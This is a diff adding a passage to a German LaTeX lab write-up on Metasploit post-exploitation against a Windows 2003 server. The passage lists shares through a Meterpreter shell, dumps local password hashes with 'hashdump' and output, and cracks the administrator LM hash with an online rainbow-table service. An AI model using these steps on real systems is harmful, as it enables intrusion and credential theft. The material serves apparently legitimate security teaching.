@@ -353,6 +353,60 @@ meterpreter > download Rezept2NJ.txt
 meterpreter > ;-)
 \end{lstlisting}
 
+Ein alternativer Weg, um in der Meterpreter-Session die Rezepte zu finden, geht über die Auflistung der vorhandenen Freigaben mit dem Windows-Befehl \emph{net use} in einer zuvor mit dem Befehl \emph{shell} geöffneten Windows-Kommandozeile. Daraus kann dann direkt der dahinterliegende Ordner gefunden und seine Inhalte aufgelistet werden... 
+
+\begin{lstlisting}[language=Metasploit]
+meterpreter > shell
+
+Process 1760 created.
+Channel 1 created.
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+C:\WINDOWS\system32 > net share
+net share
+
+Name		Ressource	Beschreibung
+-----------------------------------------------------------------------
+
+IPC$    			Remote-IPC
+ADMIN$		C:\WINDOWS  	Remoteverwaltung
+C$  		C:\		Standardfreigabe
+Geheimrezepte  	C:\Geheimrezepte
+public		C:\public	Öffentlicher Ordner
+
+Der Befehl wurde erfolgreich ausgefuhrt.
+
+C:\WINDOWS\system32 > exit
+meterpreter > ls C:\\Geheimrezepte
+
+\end{lstlisting}
+
+Außerdem kann man sich noch mit dem Befehl \emph{hashdump} die lokale Nutzerdatenbank mit den Passwort-Hashes ausgeben lassen. Die dort von Windows 2003 standardmäßig gespeicherten LM-Hashes lassen sich mit Hilfe von Rainbow-Tables innerhalb von wenigen Sekunden entschlüsseln, z. B. online unter \url{http://www.crack-online.com/}. Als Administrator-Passwort konnte beispielsweise durch das Analysieren-Lassen von\\
+\emph{30b56c5a33fbec925395a77c12853f9f:d9147b2c2e2c06320ae8af50bc71d67d}\\
+das Passwort \emph{mayermayer\#} ermittelt werden.
+
+\begin{lstlisting}[language=Metasploit]
+meterpreter > hashdump
+
+Administrator:
+	500:30b56c5a33fbec925395a77c12853f9f:d9147b2c2e2c06320ae8af50bc71d67d:::
+Christian:
+	1027:814296f64aab50f985ba78ba0ecdceb0:440103c961c4ff0c240f0c5a483e9d2c:::
+Daniela:1029:acf52f38f169af6e99be16b12419c012:746bf92e43a6d5af71eef31389c7dac4:::
+Gast:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Marcel:1025:ed121d2a2b5ecee9c9e04f959d38ccb0:6ba8c72392ed275d6b9ffb1936f9bb6a:::
+Mayer:1028:aaf5ee32cbe91ffdaad3b435b51404ee:68b83446c10ded73a192fed4dbd4cd38:::
+Mueller:
+	1033:4ed51acf7905e9a9aad3b435b51404ee:56ed5326e548a66a2187da0d5810593b:::
+Müller:1034:fb0c033ca6248c12aad3b435b51404ee:6d175e66b077b534bc30280cb0218716:::
+Rene:1026:b7731651af6345a825ad3b83fa6627c7:272da8d2ebae0086f417bce3790ce205:::
+SUPPORT_388945a0:
+	1001:aad3b435b51404eeaad3b435b51404ee:f949ba8fc7dd717fed514fc97e6025a8:::
+User0815:
+	1023:e52cac67419a9a22417eaf50cfac29c3:60ed35ce39cf0db011f4bdbd19382d72:::
+\end{lstlisting}
+
 \subsubsection{Armitage}
 
 Für den Zugriff auf das \emph{Metasploit Framework} gibt es verschiedene
